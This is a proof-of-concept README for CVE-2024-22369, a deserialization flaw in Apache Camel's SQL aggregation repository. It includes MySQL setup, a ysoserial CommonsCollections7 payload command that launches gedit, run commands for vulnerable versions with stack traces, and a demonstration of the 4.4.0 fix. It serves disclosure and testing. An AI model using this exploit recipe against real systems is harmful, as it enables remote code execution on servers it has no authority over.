# CVE-2024-22369

### Credits

This POC is based on the reproducer built by Ziyang Chen of HuaWei Open Source Management Center

The reproducer has been used to create this PoC, with some adjustments and clean up, and also enriched with some more automation.

### Prepare the enviroment

We'll need a Mysql instance

`docker run --name some-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=my-secret-pw -e MYSQL_DATABASE=db -d mysql`

Now we'll need to create the required tables:

You have two files: employee.sql and employee_completed.sql

Run the following command:

`docker run -it --rm mysql mysql -h 172.17.0.2 -uroot -p`

Insert your password, execute `USE db` and run the two SQL files.

At this stage you already have the required bits to reproduce the deserialization.

Run the following command

`docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' some-mysql`

and take note of the address.

Now edit the src/main/resources/application.properties according to what your enviroment status is.

### Payload

The payload we are using is based on commons-collections 3.2.1.

You'll need to use:

[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)

From the command line you can recreate the payload this way:

`java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \  
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \   
--add-opens java.base/java.net=ALL-UNNAMED \   
--add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections7 gedit | xxd -p`

This will return the Hex version of the payload. The idea is to run `gedit` command while deserializing.

You can play with possible payloads and change the SQL scripts by changing the INSERT statement and add the new   
generated payloads.

### Run

To reproduce the behavior. First of all select a JDK 17 (locally or through SDKMan).

The run the following command:

`mvn clean install -Dcamel.version=4.3.0 -Dspring-boot.version=3.2.0 -Djava.version=17 spring-boot:run`

This will give the following output:


    [INFO] --- spring-boot:3.2.0:run (default-cli) @ camelsql ---  
    [INFO] Attaching agents: []  
      
    .   ____          _            __ _ _  
    /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \  
    ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \  
    \\/  ___)| |_)| | | | | || (_| |  ) ) ) )  
    '  |____| .__|_| |_|_| |_\__, | / / / /  
    =========|_|==============|___/=/_/_/_/  
    :: Spring Boot ::                (v3.2.0)  
      
    2024-01-10T11:50:05.523+01:00  INFO 28404 --- [           main] c.example.camelsql.CamelsqlApplication   : Starting CamelsqlApplication using Java 17.0.8 with PID 28404 (/home/oscerd/workspace/apache-camel/security/camelsql/target/classes started by oscerd in /home/oscerd/workspace/apache-camel/security/camelsql)  
    2024-01-10T11:50:05.526+01:00  INFO 28404 --- [           main] c.example.camelsql.CamelsqlApplication   : No active profile set, falling back to 1 default profile: "default"  
    2024-01-10T11:50:06.897+01:00  INFO 28404 --- [           main] o.a.c.impl.engine.AbstractCamelContext   : Apache Camel 4.3.0 (camel-1) is starting  
    2024-01-10T11:50:06.903+01:00  INFO 28404 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...  
    2024-01-10T11:50:07.062+01:00  INFO 28404 --- [           main] com.zaxxer.hikari.pool.HikariPool        : HikariPool-1 - Added connection com.mysql.cj.jdbc.ConnectionImpl@418f890f  
    2024-01-10T11:50:07.064+01:00  INFO 28404 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.  
    2024-01-10T11:50:07.093+01:00  INFO 28404 --- [           main] o.a.c.p.a.j.JdbcAggregationRepository    : On startup there are 1 aggregate exchanges (not completed) in repository: employee  
    2024-01-10T11:50:07.094+01:00  WARN 28404 --- [           main] o.a.c.p.a.j.JdbcAggregationRepository    : On startup there are 1 completed exchanges to be recovered in repository: employee_completed  
    2024-01-10T11:50:07.096+01:00  INFO 28404 --- [           main] o.a.c.p.aggregate.AggregateProcessor     : Using RecoverableAggregationRepository by scheduling recover checker to run every 5000 millis.  
    2024-01-10T11:50:07.098+01:00  INFO 28404 --- [           main] c.s.b.CamelSpringBootApplicationListener : Starting CamelMainRunController to ensure the main thread keeps running  
    2024-01-10T11:50:07.099+01:00  INFO 28404 --- [inRunController] org.apache.camel.main.MainSupport        : Apache Camel (Main) 4.3.0 is starting  
    2024-01-10T11:50:07.106+01:00  INFO 28404 --- [           main] o.a.c.impl.engine.AbstractCamelContext   : Routes startup (started:1)  
    2024-01-10T11:50:07.107+01:00  INFO 28404 --- [           main] o.a.c.impl.engine.AbstractCamelContext   :     Started route1 (timer://select)  
    2024-01-10T11:50:07.107+01:00  INFO 28404 --- [           main] o.a.c.impl.engine.AbstractCamelContext   : Apache Camel 4.3.0 (camel-1) started in 209ms (build:0ms init:0ms start:209ms)  
    2024-01-10T11:50:07.115+01:00  INFO 28404 --- [           main] c.example.camelsql.CamelsqlApplication   : Started CamelsqlApplication in 1.839 seconds (process running for 2.453)  
    2024-01-10T11:50:08.176+01:00 ERROR 28404 --- [ timer://select] o.a.c.p.e.DefaultErrorHandler            : Failed delivery for (MessageId: 41CB7CFEF0673B6-0000000000000000 on ExchangeId: 41CB7CFEF0673B6-0000000000000000). Exhausted after delivery attempt: 1 caught: java.lang.RuntimeException: Error getting key  == 0 from repository employee  
      
    Message History (source location and message history is disabled)  
    ---------------------------------------------------------------------------------------------------------------------------------------  
    Source                                   ID                             Processor                                          Elapsed (ms)  
    route1/route1                  from[timer://select?repeatCount=1] 69  
    ...  
    route1/aggregate1              aggregate[${header.aaa} == 0] 0  
      
    Stacktrace  
    ---------------------------------------------------------------------------------------------------------------------------------------  
      
    java.lang.RuntimeException: Error getting key  == 0 from repository employee  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:366) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:341) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) ~[spring-tx-6.1.1.jar:6.1.1]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository.get(JdbcAggregationRepository.java:341) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository.get(JdbcAggregationRepository.java:335) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doAggregation(AggregateProcessor.java:483) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doProcess(AggregateProcessor.java:406) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doProcess(AggregateProcessor.java:360) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.process(AggregateProcessor.java:316) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.errorhandler.RedeliveryErrorHandler$SimpleTask.handleFirst(RedeliveryErrorHandler.java:462) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.errorhandler.RedeliveryErrorHandler$SimpleTask.run(RedeliveryErrorHandler.java:438) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.doRun(DefaultReactiveExecutor.java:199) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.executeReactiveWork(DefaultReactiveExecutor.java:189) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.tryExecuteReactiveWork(DefaultReactiveExecutor.java:166) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.schedule(DefaultReactiveExecutor.java:148) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor.scheduleMain(DefaultReactiveExecutor.java:59) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.Pipeline.process(Pipeline.java:163) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.CamelInternalProcessor.processNonTransacted(CamelInternalProcessor.java:354) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.CamelInternalProcessor.process(CamelInternalProcessor.java:330) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.component.timer.TimerConsumer.sendTimerExchange(TimerConsumer.java:293) ~[camel-timer-4.3.0.jar:4.3.0]  
    at org.apache.camel.component.timer.TimerConsumer$1.doRun(TimerConsumer.java:164) ~[camel-timer-4.3.0.jar:4.3.0]  
    at org.apache.camel.component.timer.TimerConsumer$1.run(TimerConsumer.java:136) ~[camel-timer-4.3.0.jar:4.3.0]  
    at java.base/java.util.TimerThread.mainLoop(Timer.java:566) ~[na:na]  
    at java.base/java.util.TimerThread.run(Timer.java:516) ~[na:na]  
    Caused by: java.io.StreamCorruptedException: null  
    at java.base/java.util.Hashtable.reconstitutionPut(Hashtable.java:1356) ~[na:na]  
    at java.base/java.util.Hashtable.readHashtable(Hashtable.java:1317) ~[na:na]  
    at java.base/java.util.Hashtable.readObject(Hashtable.java:1259) ~[na:na]  
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]  
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) ~[na:na]  
    at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]  
    at java.base/java.lang.reflect.Method.invoke(Method.java:568) ~[na:na]  
    at java.base/java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1100) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2423) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2257) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1733) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:509) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:467) ~[na:na]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.decode(JdbcCamelCodec.java:108) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.unmarshallExchange(JdbcCamelCodec.java:82) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.unmarshallExchange(JdbcCamelCodec.java:77) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:358) ~[camel-sql-4.3.0.jar:4.3.0]  
    ... 23 common frames omitted  
      
    2024-01-10T11:50:08.182+01:00  WARN 28404 --- [ timer://select] o.a.camel.component.timer.TimerConsumer  : Error processing exchange. Exchange[41CB7CFEF0673B6-0000000000000000]. Caused by: [java.lang.RuntimeException - Error getting key  == 0 from repository employee]  
      
    java.lang.RuntimeException: Error getting key  == 0 from repository employee  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:366) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:341) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) ~[spring-tx-6.1.1.jar:6.1.1]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository.get(JdbcAggregationRepository.java:341) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository.get(JdbcAggregationRepository.java:335) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doAggregation(AggregateProcessor.java:483) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doProcess(AggregateProcessor.java:406) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doProcess(AggregateProcessor.java:360) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.process(AggregateProcessor.java:316) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.errorhandler.RedeliveryErrorHandler$SimpleTask.handleFirst(RedeliveryErrorHandler.java:462) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.errorhandler.RedeliveryErrorHandler$SimpleTask.run(RedeliveryErrorHandler.java:438) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.doRun(DefaultReactiveExecutor.java:199) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.executeReactiveWork(DefaultReactiveExecutor.java:189) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.tryExecuteReactiveWork(DefaultReactiveExecutor.java:166) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.schedule(DefaultReactiveExecutor.java:148) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor.scheduleMain(DefaultReactiveExecutor.java:59) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.Pipeline.process(Pipeline.java:163) ~[camel-core-processor-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.CamelInternalProcessor.processNonTransacted(CamelInternalProcessor.java:354) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.impl.engine.CamelInternalProcessor.process(CamelInternalProcessor.java:330) ~[camel-base-engine-4.3.0.jar:4.3.0]  
    at org.apache.camel.component.timer.TimerConsumer.sendTimerExchange(TimerConsumer.java:293) ~[camel-timer-4.3.0.jar:4.3.0]  
    at org.apache.camel.component.timer.TimerConsumer$1.doRun(TimerConsumer.java:164) ~[camel-timer-4.3.0.jar:4.3.0]  
    at org.apache.camel.component.timer.TimerConsumer$1.run(TimerConsumer.java:136) ~[camel-timer-4.3.0.jar:4.3.0]  
    at java.base/java.util.TimerThread.mainLoop(Timer.java:566) ~[na:na]  
    at java.base/java.util.TimerThread.run(Timer.java:516) ~[na:na]  
    Caused by: java.io.StreamCorruptedException: null  
    at java.base/java.util.Hashtable.reconstitutionPut(Hashtable.java:1356) ~[na:na]  
    at java.base/java.util.Hashtable.readHashtable(Hashtable.java:1317) ~[na:na]  
    at java.base/java.util.Hashtable.readObject(Hashtable.java:1259) ~[na:na]  
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]  
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) ~[na:na]  
    at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]  
    at java.base/java.lang.reflect.Method.invoke(Method.java:568) ~[na:na]  
    at java.base/java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1100) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2423) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2257) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1733) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:509) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:467) ~[na:na]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.decode(JdbcCamelCodec.java:108) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.unmarshallExchange(JdbcCamelCodec.java:82) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.unmarshallExchange(JdbcCamelCodec.java:77) ~[camel-sql-4.3.0.jar:4.3.0]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:358) ~[camel-sql-4.3.0.jar:4.3.0]  
    ... 23 common frames omitted 


While the code will fail, at the same time you'll see gedit opening a window.

You can reproduce the same behavior with camel 3.21.3 for example. You'll need to set a JDK 11 (locally or through SDKMan)

You'll need to run:

`mvn clean install -Dcamel.version=3.21.3 -Dspring-boot.version=2.7.18 -Djava.version=11 spring-boot:run`

The behavior will be the same.

### Fix in 4.4.0

To show the fix you'll need to run

`mvn clean install -Dcamel.version=4.4.0 -Dspring-boot.version=3.2.2 -Djava.version=17 spring-boot:run`

This will give the following output:


    [INFO] --- spring-boot:3.2.1:run (default-cli) @ camelsql ---  
    [INFO] Attaching agents: []  
      
    .   ____          _            __ _ _  
    /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \  
    ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \  
    \\/  ___)| |_)| | | | | || (_| |  ) ) ) )  
    '  |____| .__|_| |_|_| |_\__, | / / / /  
    =========|_|==============|___/=/_/_/_/  
    :: Spring Boot ::                (v3.2.1)  
      
    2024-01-10T11:55:28.735+01:00  INFO 29206 --- [           main] c.example.camelsql.CamelsqlApplication   : Starting CamelsqlApplication using Java 17.0.8 with PID 29206 (/home/oscerd/workspace/apache-camel/security/camelsql/target/classes started by oscerd in /home/oscerd/workspace/apache-camel/security/camelsql)  
    2024-01-10T11:55:28.741+01:00  INFO 29206 --- [           main] c.example.camelsql.CamelsqlApplication   : No active profile set, falling back to 1 default profile: "default"  
    2024-01-10T11:55:30.122+01:00  INFO 29206 --- [           main] o.a.c.impl.engine.AbstractCamelContext   : Apache Camel 4.4.0-SNAPSHOT (camel-1) is starting  
    2024-01-10T11:55:30.131+01:00  INFO 29206 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...  
    2024-01-10T11:55:30.285+01:00  INFO 29206 --- [           main] com.zaxxer.hikari.pool.HikariPool        : HikariPool-1 - Added connection com.mysql.cj.jdbc.ConnectionImpl@261f359f  
    2024-01-10T11:55:30.286+01:00  INFO 29206 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.  
    2024-01-10T11:55:30.306+01:00  INFO 29206 --- [           main] o.a.c.p.a.j.JdbcAggregationRepository    : On startup there are 1 aggregate exchanges (not completed) in repository: employee  
    2024-01-10T11:55:30.307+01:00  WARN 29206 --- [           main] o.a.c.p.a.j.JdbcAggregationRepository    : On startup there are 1 completed exchanges to be recovered in repository: employee_completed  
    2024-01-10T11:55:30.308+01:00  INFO 29206 --- [           main] o.a.c.p.aggregate.AggregateProcessor     : Using RecoverableAggregationRepository by scheduling recover checker to run every 5000 millis.  
    2024-01-10T11:55:30.310+01:00  INFO 29206 --- [           main] c.s.b.CamelSpringBootApplicationListener : Starting CamelMainRunController to ensure the main thread keeps running  
    2024-01-10T11:55:30.312+01:00  INFO 29206 --- [inRunController] org.apache.camel.main.MainSupport        : Apache Camel (Main) 4.4.0-SNAPSHOT is starting  
    2024-01-10T11:55:30.322+01:00  INFO 29206 --- [           main] o.a.c.impl.engine.AbstractCamelContext   : Routes startup (started:1)  
    2024-01-10T11:55:30.322+01:00  INFO 29206 --- [           main] o.a.c.impl.engine.AbstractCamelContext   :     Started route1 (timer://select)  
    2024-01-10T11:55:30.322+01:00  INFO 29206 --- [           main] o.a.c.impl.engine.AbstractCamelContext   : Apache Camel 4.4.0-SNAPSHOT (camel-1) started in 198ms (build:0ms init:0ms start:198ms)  
    2024-01-10T11:55:30.328+01:00  INFO 29206 --- [           main] c.example.camelsql.CamelsqlApplication   : Started CamelsqlApplication in 1.844 seconds (process running for 2.102)  
    2024-01-10T11:55:31.352+01:00 ERROR 29206 --- [ timer://select] o.a.c.p.e.DefaultErrorHandler            : Failed delivery for (MessageId: 5F06C78575E3CDB-0000000000000000 on ExchangeId: 5F06C78575E3CDB-0000000000000000). Exhausted after delivery attempt: 1 caught: java.lang.RuntimeException: Error getting key  == 0 from repository employee  
      
    Message History (source location and message history is disabled)  
    ---------------------------------------------------------------------------------------------------------------------------------------  
    Source                                   ID                             Processor                                          Elapsed (ms)  
    route1/route1                  from[timer://select?repeatCount=1] 30  
    ...  
    route1/aggregate1              aggregate[${header.aaa} == 0] 0  
      
    Stacktrace  
    ---------------------------------------------------------------------------------------------------------------------------------------  
      
    java.lang.RuntimeException: Error getting key  == 0 from repository employee  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:367) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:342) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) ~[spring-tx-6.1.2.jar:6.1.2]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository.get(JdbcAggregationRepository.java:342) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository.get(JdbcAggregationRepository.java:336) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doAggregation(AggregateProcessor.java:483) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doProcess(AggregateProcessor.java:406) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doProcess(AggregateProcessor.java:360) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.process(AggregateProcessor.java:316) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.errorhandler.RedeliveryErrorHandler$SimpleTask.handleFirst(RedeliveryErrorHandler.java:462) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.errorhandler.RedeliveryErrorHandler$SimpleTask.run(RedeliveryErrorHandler.java:438) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.doRun(DefaultReactiveExecutor.java:199) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.executeReactiveWork(DefaultReactiveExecutor.java:189) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.tryExecuteReactiveWork(DefaultReactiveExecutor.java:166) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor$Worker.schedule(DefaultReactiveExecutor.java:148) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.DefaultReactiveExecutor.scheduleMain(DefaultReactiveExecutor.java:59) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.Pipeline.process(Pipeline.java:163) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.CamelInternalProcessor.processNonTransacted(CamelInternalProcessor.java:354) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.impl.engine.CamelInternalProcessor.process(CamelInternalProcessor.java:330) ~[camel-base-engine-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.component.timer.TimerConsumer.sendTimerExchange(TimerConsumer.java:293) ~[camel-timer-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.component.timer.TimerConsumer$1.doRun(TimerConsumer.java:164) ~[camel-timer-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.component.timer.TimerConsumer$1.run(TimerConsumer.java:136) ~[camel-timer-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at java.base/java.util.TimerThread.mainLoop(Timer.java:566) ~[na:na]  
    at java.base/java.util.TimerThread.run(Timer.java:516) ~[na:na]  
    Caused by: java.io.InvalidClassException: filter status: REJECTED  
    at java.base/java.io.ObjectInputStream.filterCheck(ObjectInputStream.java:1409) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:2044) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1898) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2224) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1733) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:509) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:467) ~[na:na]  
    at java.base/java.util.Hashtable.readHashtable(Hashtable.java:1313) ~[na:na]  
    at java.base/java.util.Hashtable.readObject(Hashtable.java:1259) ~[na:na]  
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]  
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) ~[na:na]  
    at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]  
    at java.base/java.lang.reflect.Method.invoke(Method.java:568) ~[na:na]  
    at java.base/java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1100) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2423) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2257) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1733) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:509) ~[na:na]  
    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:467) ~[na:na]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.decode(JdbcCamelCodec.java:104) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.unmarshallExchange(JdbcCamelCodec.java:77) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcCamelCodec.unmarshallExchange(JdbcCamelCodec.java:72) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:359) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    ... 23 common frames omitted  
      
    2024-01-10T11:55:31.355+01:00  WARN 29206 --- [ timer://select] o.a.camel.component.timer.TimerConsumer  : Error processing exchange. Exchange[5F06C78575E3CDB-0000000000000000]. Caused by: [java.lang.RuntimeException - Error getting key  == 0 from repository employee]  
      
    java.lang.RuntimeException: Error getting key  == 0 from repository employee  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:367) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository$4.doInTransaction(JdbcAggregationRepository.java:342) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) ~[spring-tx-6.1.2.jar:6.1.2]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository.get(JdbcAggregationRepository.java:342) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.jdbc.JdbcAggregationRepository.get(JdbcAggregationRepository.java:336) ~[camel-sql-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doAggregation(AggregateProcessor.java:483) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
    at org.apache.camel.processor.aggregate.AggregateProcessor.doProcess(AggregateProcessor.java:406) ~[camel-core-processor-4.4.0-SNAPSHOT.jar:4.4.0-SNAPSHOT]  
